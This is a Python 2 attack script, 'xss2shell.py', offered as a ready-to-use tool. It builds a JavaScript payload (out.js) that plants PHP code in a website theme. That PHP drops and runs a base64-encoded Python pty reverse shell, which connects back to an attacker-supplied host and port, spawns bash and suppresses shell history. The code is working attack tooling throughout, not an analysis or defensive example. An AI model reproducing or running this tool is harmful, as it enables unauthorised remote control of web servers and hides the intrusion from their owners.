#!/usr/bin/python2
# -*- coding: utf-8 -*-
#python pty shell provided by infodox
import subprocess, base64, sys, urllib

rshell = """import os
import pty
import socket

lhost = "%s"
lport = %s

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((lhost, lport))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    os.putenv("HISTFILE",'/dev/null')
    pty.spawn("/bin/bash")
    s.close()

if __name__ == "__main__":
    main()"""

print """
▐▄• ▄ .▄▄ · .▄▄ ·     ▪  ▪      .▄▄ ·  ▄ .▄▄▄▄ .▄▄▌  ▄▄▌  
 █▌█▌▪▐█ ▀. ▐█ ▀.     ██ ██     ▐█ ▀. ██▪▐█▀▄.▀·██•  ██•  
 ·██· ▄▀▀▀█▄▄▀▀▀█▄    ▐█·▐█·    ▄▀▀▀█▄██▀▐█▐▀▀▪▄██▪  ██▪  
▪▐█·█▌▐█▄▪▐█▐█▄▪▐█    ▐█▌▐█▌    ▐█▄▪▐███▌▐▀▐█▄▄▌▐█▌▐▌▐█▌▐▌
•▀▀ ▀▀ ▀▀▀▀  ▀▀▀▀     ▀▀▀▀▀▀     ▀▀▀▀ ▀▀▀ · ▀▀▀ .▀▀▀ .▀▀▀
"""

def help():
	print('''Usage:
  -> Default python pty reverse shell: ./xss2shell.py [lhost] [lport]
  -> Custom php payload (no tags): ./xss2shell.py custom [payload.php]''')

def preparepayload(payload, theme):
	f = open('footer.php').read()
	payload = f % (payload, '%s')
	payload = urllib.quote_plus(payload)
	f = open('payload.js').read()
	payload = f % (theme, theme, payload, theme)
	open('out.js', 'w').write(payload)
	print('[+] out.js generated!')

def genpayload(lhost, payload, rshell, theme):
	rshell = base64.b64encode(rshell % (lhost, lport))
	payload = 'file_put_contents("/tmp/rshell.py", base64_decode("%s")); system("python /tmp/rshell.py; rm /tmp/rshell.py");' % (rshell)
	preparepayload(payload, theme)

try:
	theme = raw_input('[!] Enter theme in use: ')
	if sys.argv[1].lower() == 'custom':
		print('[+] Using custom payload: %s' % (sys.argv[2]))
		payload = open(sys.argv[2]).read()
		preparepayload(payload, theme)
	elif sys.argv[1].lower() == 'help':
		help()
	else:
		print('[+] Using default payload: python pty reverse shell')
		lhost = sys.argv[1]
		lport = sys.argv[2]
		genpayload(lhost, lport, rshell, theme)
except:
	help()
